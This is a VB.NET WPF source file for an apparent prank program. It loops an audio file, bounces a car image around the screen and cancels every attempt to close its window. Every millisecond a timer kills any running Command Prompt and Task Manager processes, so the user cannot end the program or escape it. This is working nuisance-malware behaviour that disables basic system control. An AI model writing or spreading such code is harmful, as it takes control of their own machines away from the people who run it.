Imports System.Windows.Threading
Imports System.Windows.Media
Imports System.Runtime.InteropServices
Imports Microsoft.VisualBasic.Collection


Class MainWindow

    Dim timer As DispatcherTimer
    Dim transForm As TranslateTransform
    Dim conv As New BooleanToVisibilityConverter
    Dim X = 0
    Dim Y = 0
    Dim Yinc = -1
    Dim Xinc = -5
    Dim pointedRight = 1
    Dim p As New Media.SoundPlayer(My.Resources.imw)
    Dim p1 As New MediaElement()

    Public Sub New()

        InitializeComponent()

        'Dim player As New System.Media.SoundPlayer("C:\Users\Adam Al-Jumaily\Documents\Visual Studio 2015\Projects\WpfApplication1\WpfApplication1\Resources\im.wav")
        'Dim player As New System.Media.SoundPlayer(Application.GetResourceStream(New Uri("Resources\im.wav", UriKind.Relative)).Stream)
        'player.PlayLooping()

        'My.Computer.Audio.Play(My.Resources.im, AudioPlayMode.BackgroundLoop)
        'p.PlayLooping()

        'p1.Source = New Uri("Resources\im.wav", UriKind.Relative)
        ' song.LoadedBehavior = MediaState.Manual


        Dim memStream As New System.IO.MemoryStream
        My.Resources.imw.CopyTo(memStream)
        Dim byteArr() As Byte = memStream.ToArray

        Dim FilePath As String = My.Application.Info.DirectoryPath + "\GOTEM.mp3"
        IO.File.WriteAllBytes(FilePath, byteArr)

        song.Source = New Uri("GOTEM.mp3", UriKind.Relative)
        song.Volume = 100
        song.IsMuted = False
        song.Position = TimeSpan.FromMilliseconds(0)
        song.Play()

        ' Dim p1 As New WMPLib.WindowsMediaPlayer()
        'p1.URL = "Resources\im.wav"

        transForm = New TranslateTransform(X, Y)


        timer = New DispatcherTimer()
        timer.Interval = TimeSpan.FromMilliseconds(1)

        AddHandler timer.Tick, AddressOf timerTick


        timer.Start()

    End Sub

    Private Sub songOver(sender As Object, e As EventArgs) Handles song.MediaEnded
        song.Position = TimeSpan.Zero
        song.Play()
    End Sub

    Private Sub checkKeyPress(sender As Object, e As KeyEventArgs) Handles Me.KeyDown
        If (Keyboard.IsKeyDown(Key.LeftCtrl) AndAlso Keyboard.IsKeyDown(Key.LeftAlt)) Then
            My.Computer.Audio.Play(My.Resources.nani, AudioPlayMode.Background)
        End If
        If (e.Key = Key.R) Then
            e.Handled = True
        End If
    End Sub

    Private Sub Form1_Closing(sender As Object, e As _
     System.ComponentModel.CancelEventArgs) Handles MyBase.Closing
        e.Cancel = True
        My.Computer.Audio.Play(My.Resources.what, AudioPlayMode.Background)
    End Sub

    Private Sub timerTick(sender As Object, e As EventArgs)

        For Each proc As Process In Process.GetProcesses
            If proc.ProcessName = "cmd" Then
                proc.Kill()
            End If
        Next

        For Each proc As Process In Process.GetProcesses
            If proc.ProcessName = "Taskmgr" Then
                proc.Kill()
            End If
        Next

        X += Xinc
        Y += Yinc

        transForm.Transform(New Point(X, Y))
        Canv.SetTop(Car, Y)
        Canv.SetLeft(Car, X)
        Canv.SetTop(Car1, Y)
        Canv.SetLeft(Car1, X)
        Car.RenderTransform = transForm
        Car1.RenderTransform = transForm

        If ((X + Car.Width - 15) > System.Windows.SystemParameters.PrimaryScreenWidth) Or (X + 15 < 0) Then
            Xinc = -Xinc
            If pointedRight = 1 Then
                Car.Visibility = False
                Car1.Visibility = True
                pointedRight = 0
            ElseIf pointedRight = 0 Then
                Car.Visibility = True
                Car1.Visibility = False
                pointedRight = 1
            End If
        End If
        If ((Y + Car.Height - 10) > System.Windows.SystemParameters.PrimaryScreenHeight) Or (Y + 10 < 0) Then
            Yinc = -Yinc
        End If
    End Sub
End Class
